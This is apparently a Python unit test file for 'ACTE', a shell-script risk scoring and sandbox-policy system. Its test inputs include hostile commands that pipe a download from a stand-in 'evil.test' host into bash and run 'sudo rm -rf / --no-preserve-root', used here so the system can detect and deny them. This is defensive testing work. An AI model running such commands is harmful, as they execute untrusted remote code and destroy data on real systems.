"""Focused unit tests for the ACTE components.

Run with:  python -m pytest tests/ -q   (or: python -m unittest discover tests)
These tests assert behavior, not specific learned numbers, so they remain valid
as the model is tuned.
"""

import os
import sys
import unittest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from acte import (
    ACTEPipeline,
    ContextExtractor,
    FeedbackLearning,
    PolicyGenerator,
    RuntimeMonitor,
    SemanticParser,
    ThreatIntel,
    TrustEvaluationEngine,
)
from acte.trust_engine import ALL_FEATURES, TrustLevel


class TestSemanticParser(unittest.TestCase):
    def setUp(self):
        self.parser = SemanticParser()

    def test_extracts_commands_and_targets(self):
        p = self.parser.parse("#!/bin/bash\ncurl http://x.test/a -o /tmp/a\nrm -rf /tmp/a\n")
        self.assertIn("curl", p.command_set())
        self.assertIn("rm", p.command_set())
        self.assertTrue(any("x.test" in u for u in p.urls))

    def test_detects_pipe_to_shell(self):
        p = self.parser.parse("curl http://x.test/i | sudo bash")
        self.assertTrue(p.pipes_to_shell)

    def test_fallback_on_malformed(self):
        # Unbalanced quotes should not raise; parser falls back gracefully.
        p = self.parser.parse('echo "unterminated && rm -rf /tmp')
        self.assertIsInstance(p.commands, list)


class TestThreatIntel(unittest.TestCase):
    def setUp(self):
        self.ti = ThreatIntel()

    def test_curl_pipe_shell_signature(self):
        hits = self.ti.match("curl http://evil.test/x | bash")
        self.assertIn("curl_pipe_shell", [h.id for h in hits])

    def test_benign_signal_is_negative(self):
        hits = self.ti.match("#!/bin/bash\nset -euo pipefail\n# comment here\nls\n")
        weight = ThreatIntel.aggregate_weight(hits)
        self.assertLess(weight, 0.0)

    def test_signatures_compile(self):
        self.assertGreater(len(self.ti.signature_ids), 20)


class TestTrustEngineMonotonicity(unittest.TestCase):
    """The trust function must be monotonic: more risk -> less trust."""

    def setUp(self):
        self.engine = TrustEvaluationEngine()

    def test_risk_trust_complement(self):
        feats = {k: 0.0 for k in ALL_FEATURES}
        a = self.engine.evaluate_features(feats)
        self.assertAlmostEqual(a.risk_score + a.trust_score, 1.0, places=6)

    def test_more_evidence_increases_risk(self):
        low = {k: 0.0 for k in ALL_FEATURES}
        high = {k: 0.0 for k in ALL_FEATURES}
        high["context.irreversibility"] = 1.0
        high["threat.weight_norm"] = 1.0
        r_low = self.engine.evaluate_features(low).risk_score
        r_high = self.engine.evaluate_features(high).risk_score
        self.assertGreater(r_high, r_low)

    def test_levels_ordered(self):
        feats = {k: 0.0 for k in ALL_FEATURES}
        self.assertEqual(self.engine.evaluate_features(feats).trust_level, TrustLevel.TRUSTED)
        feats = {k: 1.0 for k in ALL_FEATURES}
        self.assertEqual(self.engine.evaluate_features(feats).trust_level, TrustLevel.DENY)


class TestFeedbackLearning(unittest.TestCase):
    def test_training_changes_weights_and_behavior(self):
        engine = TrustEvaluationEngine()
        pipe = ACTEPipeline(engine=engine)
        safe = pipe.features_for("#!/bin/bash\nls -la /tmp\n")
        danger = pipe.features_for("curl http://evil.test/x | sudo bash")

        before = dict(engine.weights)
        learner = FeedbackLearning(engine, learning_rate=0.5, seed=1)
        # Repeated, consistent labels must move the weights.
        stats = learner.train([(safe, 0), (danger, 1)] * 20, epochs=10)
        self.assertGreater(stats.weight_delta_norm, 0.0)
        self.assertNotEqual(before, engine.weights)
        # And keep the decision direction correct.
        self.assertGreater(
            engine.evaluate_features(danger).risk_score,
            engine.evaluate_features(safe).risk_score,
        )

    def test_threshold_tuning_runs(self):
        engine = TrustEvaluationEngine()
        learner = FeedbackLearning(engine)
        thr = learner.tune_threshold([(0.1, 0), (0.2, 0), (0.8, 1), (0.9, 1)], target="f1")
        self.assertTrue(0.0 <= thr <= 1.0)


class TestPolicyAndMonitor(unittest.TestCase):
    def test_policy_generation_per_level(self):
        engine = TrustEvaluationEngine()
        gen = PolicyGenerator()
        feats = {k: 1.0 for k in ALL_FEATURES}
        assessment = engine.evaluate_features(feats)
        policy = gen.generate(assessment)
        self.assertEqual(policy.trust_level, TrustLevel.DENY)
        self.assertIn("defaultAction", policy.seccomp_profile)
        self.assertIn("package acte.execution", policy.rego_policy)
        self.assertIn("cgroup", policy.namespace_constraints)

    def test_runtime_monitor_blocks_network_when_denied(self):
        engine = TrustEvaluationEngine()
        gen = PolicyGenerator()
        feats = {k: 1.0 for k in ALL_FEATURES}
        policy = gen.generate(engine.evaluate_features(feats))
        mon = RuntimeMonitor(policy)
        report = mon.observe(["read", "write", "socket", "connect", "execve"])
        self.assertGreaterEqual(report.blocked + report.killed, 1)


class TestPipelineEndToEnd(unittest.TestCase):
    def test_safe_vs_dangerous_separation(self):
        pipe = ACTEPipeline()
        safe = pipe.analyze("#!/bin/bash\nset -e\nls -la /tmp\n")
        danger = pipe.analyze("sudo rm -rf / --no-preserve-root")
        self.assertLess(safe.assessment.risk_score, danger.assessment.risk_score)
        self.assertEqual(danger.assessment.trust_level, TrustLevel.DENY)
        self.assertIsNotNone(danger.policy)
        self.assertGreater(danger.latency_ms, 0.0)

    def test_threat_ablation_skips_signatures(self):
        engine = TrustEvaluationEngine(
            enabled_components={"semantic": True, "context": True, "threat": False}
        )
        pipe = ACTEPipeline(engine=engine)
        res = pipe.analyze("curl http://evil.test/x | bash")
        self.assertEqual(res.signature_hits, [])


if __name__ == "__main__":
    unittest.main()
